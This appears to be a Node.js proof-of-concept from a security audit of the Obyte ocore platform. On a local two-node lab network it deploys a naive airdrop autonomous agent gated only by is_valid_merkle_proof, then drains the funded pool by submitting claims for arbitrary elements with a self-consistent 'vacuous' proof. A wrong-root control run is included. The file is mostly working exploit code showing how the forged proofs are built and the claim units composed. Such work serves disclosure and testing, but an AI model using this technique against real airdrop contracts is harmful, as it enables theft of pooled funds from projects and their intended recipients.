// E4-4 — airdrop-claim AA demo: naive airdrop AA (claim gated ONLY by is_valid_merkle_proof)
// drained by claiming with the vacuous proof for arbitrary elements NOT on any airdrop list.
// Finding obyte-2026-08-001 (F1) fund-impact class, realistic form.
// Base: e31-aa-demo.js (confirmed AA path on the two-node network) + e17b-boot.js.
// ROLE=hub  PORT=6611 : posts definition + pool-funding + waypoints + claim triggers(+data), relays over ws.
// ROLE=node PORT=6612 : receives, validates, saves, stabilizes; the AA fires at stabilization.
// SCENARIO=attack : each claim carries element=ARBITRARY-NOT-ON-LIST + VACUOUS proof -> IF TRUE ->
//                   AIRDROP_AMOUNT paid to the claimer -> the pool drains.
// SCENARIO=control: each claim carries element + WRONG-ROOT proof -> IF FALSE -> bounce -> no payout.
"use strict";
const path = require("path");
const crypto = require("crypto");
const O_CORE = "/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore";
const WebSocket = require(O_CORE + "/node_modules/ws");
const { boot, keys, defOf, signHash, sleep, TOTAL } = require("./e17b-boot.js");

const ROLE = process.env.ROLE || "hub";
const PORT = parseInt(process.env.PORT || (ROLE === "hub" ? 6611 : 6612), 10);
const NODE_PORT = parseInt(process.env.NODE_PORT || 6612, 10);
const SCENARIO = process.env.SCENARIO || "attack";
const DATA = path.join(__dirname, ".e44-" + SCENARIO + "-" + ROLE);

const POOL = 10000;            // the airdrop pool (funded once into the AA)
const AIRDROP_AMOUNT = 1000;   // per-claim payout
const N_CLAIMS = 3;            // the attacker claims N times with arbitrary elements

function sha256b64(str) { return crypto.createHash("sha256").update(str, "utf8").digest("base64"); }

// the NAIVE airdrop AA: any claim whose element "is in the merkle tree" is paid.
// The AA author trusts is_valid_merkle_proof to prove membership — it does not pin the root,
// so the vacuous self-consistent proof satisfies it for ANY element.
function aaDefinition() {
	return ["autonomous agent", {
		bounce_fees: { base: 10000 },
		messages: {
			cases: [
				{
					if: "{is_valid_merkle_proof(trigger.data.element, trigger.data.proof)}",
					messages: [
						{
							app: "payment",
							payload: {
								asset: "base",
								outputs: [{ address: "{trigger.address}", amount: AIRDROP_AMOUNT }]
							}
						}
					]
				}
			]
		}
	}];
}

function makeSigner(key) {
	const constants = require(O_CORE + "/constants.js");
	return {
		readDefinition: (conn, address, cb) => cb(null, defOf(key)),
		readSigningPaths: (conn, address, cb) => cb({ r: constants.SIG_LENGTH }),
		readPrivateKey: (address, p, cb) => cb(null, Buffer.from(key.priv, "hex")),
	};
}

function dump(ctx, tag) {
	return Promise.all([
		ctx.query("SELECT address, unit, mci FROM aa_addresses ORDER BY address"),
		ctx.query("SELECT mci, unit, address FROM aa_triggers ORDER BY mci"),
		ctx.query("SELECT unit, level, main_chain_index, is_stable, sequence, is_on_main_chain, is_aa_response FROM units ORDER BY main_chain_index"),
		ctx.query("SELECT o.unit, o.output_index, o.address, o.amount FROM outputs o ORDER BY o.unit, o.output_index"),
	]).then(([aa, trig, units, outs]) => {
		console.log("[" + tag + "] AA_ADDRESSES:", JSON.stringify(aa));
		console.log("[" + tag + "] UNITS:", JSON.stringify(units.map(r => ({ mci: r.main_chain_index, seq: r.sequence, st: r.is_stable, aa: r.is_aa_response }))));
		console.log("[" + tag + "] OUTPUTS:", JSON.stringify(outs.slice(-12)));
		return { aa, trig, units, outs };
	});
}

function openRelayClient(url) {
	return new Promise((resolve, reject) => {
		const ws = new WebSocket(url, { maxPayload: 6 * 1024 * 1024 });
		const timer = setTimeout(() => reject(new Error("ws connect timeout")), 8000);
		ws.on("error", (e) => { clearTimeout(timer); reject(new Error("ws error: " + e)); });
		ws.on("open", () => {
			clearTimeout(timer);
			ws.send(JSON.stringify(["justsaying", { subject: "version", body: { protocol_version: "4.0", alt: "1", library: "ocore", library_version: "0.4.6", program: "e44-lab", program_version: "0.0.1" } }]));
			ws.send(JSON.stringify(["request", { tag: "sub-e44", command: "subscribe", params: { subscription_id: "e44-sub", last_mci: 0, library_version: "0.4.6" } }]));
			setTimeout(() => resolve(ws), 800);
		});
	});
}
function sendJoint(ws, joint) {
	if (ws.readyState === 1) { ws.send(JSON.stringify(["justsaying", { subject: "joint", body: joint }])); return true; }
	return false;
}

function composeGeneric(ctx, key, address, opts) {
	return new Promise((resolve, reject) => {
		ctx.composer.composeJoint({
			paying_addresses: [address],
			signing_addresses: [address],
			outputs: opts.outputs || [{ address, amount: 0 }],
			messages: opts.messages || [],
			signer: makeSigner(key),
			callbacks: {
				ifOk: (joint, assocPrivatePayloads, unlock_callback) => { unlock_callback(); resolve(joint); },
				ifError: (e) => reject(new Error(opts.label + " compose error: " + JSON.stringify(e).slice(0, 250))),
				ifNotEnoughFunds: (e) => reject(new Error(opts.label + " not enough funds: " + e)),
			},
		});
	});
}

async function main() {
	const ctx = await boot(DATA, PORT, { bServeAsHub: ROLE === "hub" });
	// register the lab addresses in my_addresses so the composer's 'own' spend_unconfirmed
	// confirmation condition can spend the lab units' change outputs (the raw boot doesn't).
	for (const addr of [ctx.user_addr, ctx.witness_addr]) {
		await ctx.query("INSERT OR IGNORE INTO my_addresses (address) VALUES (?)", [addr]);
	}
	console.log("[" + ROLE + "/" + SCENARIO + "] booted port", PORT, "genesis", ctx.genesis.unit.slice(0, 12) + "...");

	if (ROLE === "node") {
		console.log("[node] waiting for the hub's unit stream + AA claims...");
		let aaFired = false;
		for (let i = 0; i < 240; i++) {
			await sleep(1000);
			const trig = await ctx.query("SELECT COUNT(*) AS c FROM aa_triggers");
			const resp = await ctx.query("SELECT COUNT(*) AS c FROM units WHERE is_aa_response=1");
			if (trig[0].c > 0 || resp[0].c > 0) {
				aaFired = true;
				console.log("[node] AA trigger machinery engaged (aa_triggers=" + trig[0].c + " responses=" + resp[0].c + ")");
			}
			const stable = await ctx.query("SELECT COUNT(*) AS c FROM units WHERE is_stable=1");
			if (aaFired && stable[0].c >= 8) break;
		}
		await sleep(5000);
		const state = await dump(ctx, "node-final");
		const aaAddr = state.aa[0] && state.aa[0].address;
		const outs = state.outs.filter(o => aaAddr && o.address !== aaAddr);
		const responses = state.units.filter(r => r.is_aa_response === 1);
		const payouts = outs.filter(o => o.amount === AIRDROP_AMOUNT);
		console.log("[node] AA_RESPONSES:", JSON.stringify(responses.map(r => ({ u: r.unit.slice(0, 12), seq: r.sequence }))));
		console.log("[node] PAYOUT-OUTPUTS (AIRDROP_AMOUNT to non-AA addresses):", JSON.stringify(payouts));
		console.log("[node] SCENARIO-RESULT:", SCENARIO, "payouts=" + payouts.length + "/" + N_CLAIMS,
			SCENARIO === "attack" ? (payouts.length >= N_CLAIMS ? "DRAIN-CONFIRMED" : "DRAIN-FAILED (" + payouts.length + " of " + N_CLAIMS + ")") :
			                                (payouts.length === 0 ? "CONTROL-CONFIRMED (no payouts)" : "CONTROL-FAILED (" + payouts.length + " payouts fired)"));
		const stable = state.units.filter(r => r.is_stable === 1).length;
		console.log("NODE-DONE stable=" + stable + " aa_addresses=" + state.aa.length + " aa_triggers_left=" + state.trig.length);
		const pass = SCENARIO === "attack" ? (payouts.length >= N_CLAIMS && aaFired) : (payouts.length === 0 && aaFired);
		process.exit(pass ? 0 : 3);
	}

	// ---- hub ----
	await sleep(3000);
	const ws = await openRelayClient("ws://127.0.0.1:" + NODE_PORT);
	const objectHash = ctx.objectHash;
	const aaDef = aaDefinition();
	const aa_addr = objectHash.getChash160(aaDef);
	console.log("[hub/" + SCENARIO + "] AA address:", aa_addr.slice(0, 16) + "...");

	// build the claim data (attack: vacuous proofs for arbitrary elements; control: wrong-root proofs)
	function claimData(i) {
		if (SCENARIO === "attack") {
			const element = "airdrop-claimant-" + i + "-NOT-ON-THE-LIST-" + crypto.randomBytes(4).toString("hex");
			const proof = "0-" + sha256b64(element); // VACUOUS: root = hash(element), no siblings, index 0
			return { element, proof };
		}
		const element = "legit-claimant-" + i;
		const proof = "0-" + sha256b64("different-root-" + i); // WRONG ROOT -> the self-consistency check fails
		return { element, proof };
	}

	const seq = [
		{ label: "DEFINITION", key: keys.user, addr: ctx.user_addr, opts: { messages: [{ app: "definition", payload: { address: aa_addr, definition: aaDef } }] } },
		{ label: "WAYPOINT-A", key: keys.witness, addr: ctx.witness_addr, opts: {} },
		{ label: "FUND-POOL", key: keys.user, addr: ctx.user_addr, opts: { outputs: [{ address: aa_addr, amount: POOL }, { address: ctx.user_addr, amount: 0 }] } },
		{ label: "WAYPOINT-B", key: keys.witness, addr: ctx.witness_addr, opts: {} },
	];
	for (let i = 1; i <= N_CLAIMS; i++) {
		const d = claimData(i);
		seq.push({ label: "CLAIM-" + i, key: keys.user, addr: ctx.user_addr, opts: {
			outputs: [{ address: aa_addr, amount: 0 }], // trigger output = 0 (zero-amount AA trigger); composer adds the change
			messages: [{ app: "data", payload: { element: d.element, proof: d.proof } }],
		} });
		seq.push({ label: "WAYPOINT-" + i, key: keys.witness, addr: ctx.witness_addr, opts: {} });
	}
	seq.push({ label: "WAYPOINT-EXTRA", key: keys.witness, addr: ctx.witness_addr, opts: {} });

	for (const step of seq) {
		const joint = await composeGeneric(ctx, step.key, step.addr, Object.assign({ label: step.label }, step.opts));
		await ctx.validateAndSave(joint, step.label);
		if (sendJoint(ws, joint)) console.log("[hub] relayed " + step.label);
		await sleep(1500); // the NEXT unit's arrival is what stabilizes the previous (stable-in-later-units)
	}
	await sleep(12000);
	const state = await dump(ctx, "hub-final");
	const stable = state.units.filter(r => r.is_stable === 1).length;
	console.log("HUB-DONE stable=" + stable + " aa_addresses=" + state.aa.length + " aa_triggers_left=" + state.trig.length);
	process.exit(state.aa.length >= 1 ? 0 : 4);
}

main().catch(e => { console.error(ROLE + "-ERR:", e); process.exit(2); });
